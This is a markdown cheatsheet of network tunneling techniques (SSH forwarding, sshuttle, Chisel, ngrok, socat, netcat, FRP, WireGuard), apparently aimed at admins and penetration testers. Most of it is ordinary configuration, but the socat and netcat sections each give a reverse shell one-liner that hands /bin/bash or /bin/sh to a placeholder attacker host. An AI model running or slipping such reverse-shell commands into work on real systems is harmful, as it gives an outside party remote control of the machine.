# Tunneling Cheatsheet

## 1. **SSH Tunneling**

### 1.1 **Local Port Forwarding**
Forward local port to a remote service.
```sh
ssh -L <local_port>:<remote_host>:<remote_port> user@remote_host
```
Example:
```sh
ssh -L 8080:127.0.0.1:3306 user@server.com
```
Access MySQL on localhost:8080.

### 1.2 **Remote Port Forwarding**
Expose a local service to a remote machine.
```sh
ssh -R <remote_port>:<local_host>:<local_port> user@remote_host
```
Example:
```sh
ssh -R 9000:127.0.0.1:22 user@server.com
```
Access local SSH via `server.com:9000`.

### 1.3 **Dynamic Port Forwarding (SOCKS Proxy)**
```sh
ssh -D <local_port> user@remote_host
```
Example:
```sh
ssh -D 9050 user@server.com
```
Configure browser proxy: `socks5://127.0.0.1:9050`

---

## 2. **SSHuttle (VPN-like SSH Tunnel)**
```sh
sshuttle -r user@remote_host 0/0
```
For specific IP ranges:
```sh
sshuttle -r user@remote_host 192.168.1.0/24
```

---

## 3. **Chisel (Reverse HTTP Tunnel)**
### 3.1 **Setup Chisel Server**
```sh
./chisel server --reverse --port 8000
```
### 3.2 **Client Connection (Forward Mode)**
```sh
./chisel client <server>:8000 <local_port>:<remote_host>:<remote_port>
```
Example:
```sh
./chisel client server.com:8000 8080:127.0.0.1:80
```
### 3.3 **Client Connection (Reverse Mode)**
```sh
./chisel client --reverse <server>:8000 R:<remote_port>:<local_host>:<local_port>
```
Example:
```sh
./chisel client --reverse server.com:8000 R:9000:127.0.0.1:22
```

---

## 4. **Ngrok (Expose Local Services Publicly)**
### 4.1 **HTTP Tunnel**
```sh
ngrok http 80
```
### 4.2 **TCP Tunnel**
```sh
ngrok tcp 22
```

---

## 5. **Socat (Advanced Port Forwarding & Proxying)**
### 5.1 **Simple Port Forwarding**
```sh
socat TCP-LISTEN:<local_port>,fork TCP:<remote_host>:<remote_port>
```
Example:
```sh
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80
```
### 5.2 **Reverse Shell over TCP**
```sh
socat TCP:<attacker_ip>:4444 EXEC:/bin/bash
```
### 5.3 **Proxying Between Two Ports**
```sh
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```

---

## 6. **Metasploit Auto-SSH Tunneling**
```sh
use auxiliary/server/ssh
set SRVPORT 2222
set SRVHOST 0.0.0.0
run
```

---

## 7. **Rinetd (Static Port Forwarding)**
### 7.1 **Configure `/etc/rinetd.conf`**
```
0.0.0.0 8080 192.168.1.100 80
```
Restart rinetd:
```sh
service rinetd restart
```

---

## 8. **Port Forwarding via Netcat**
### 8.1 **Basic TCP Forwarding**
```sh
mkfifo /tmp/f; nc -l -p 8080 < /tmp/f | nc target.com 80 > /tmp/f
```
### 8.2 **Reverse Shell**
```sh
nc -e /bin/sh attacker.com 4444
```

---

## 9. **AutoSSH (Persistent SSH Tunnel)**
```sh
autossh -M 0 -N -R 9000:localhost:22 user@remote_host
```

---

## 10. **WireGuard VPN (Simple & Secure VPN)**
### 10.1 **Setup WireGuard Server**
Edit `/etc/wireguard/wg0.conf`:
```
[Interface]
Address = 10.0.0.1/24
PrivateKey = <server_private_key>
ListenPort = 51820

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32
```
Enable WireGuard:
```sh
wg-quick up wg0
```
### 10.2 **Setup WireGuard Client**
Edit `/etc/wireguard/wg0.conf`:
```
[Interface]
Address = 10.0.0.2/24
PrivateKey = <client_private_key>

[Peer]
PublicKey = <server_public_key>
Endpoint = <server_ip>:51820
AllowedIPs = 0.0.0.0/0
```
Start the VPN:
```sh
wg-quick up wg0
```

---

## 11. **FRP (Fast Reverse Proxy)**
### 11.1 **Server Configuration (`frps.ini`)**
```
[common]
bind_port = 7000
```
Start FRP server:
```sh
./frps -c frps.ini
```
### 11.2 **Client Configuration (`frpc.ini`)**
```
[common]
server_addr = <server_ip>
server_port = 7000

[ssh]
type = tcp
local_port = 22
remote_port = 9000
```
Start FRP client:
```sh
./frpc -c frpc.ini
```
Access SSH via `server_ip:9000`

---

## Conclusion
This cheatsheet covers various tunneling techniques using SSH, Chisel, Ngrok, Socat, and other tools. Choose the method based on your requirements (port forwarding, reverse shells, VPN-like tunneling, etc.).
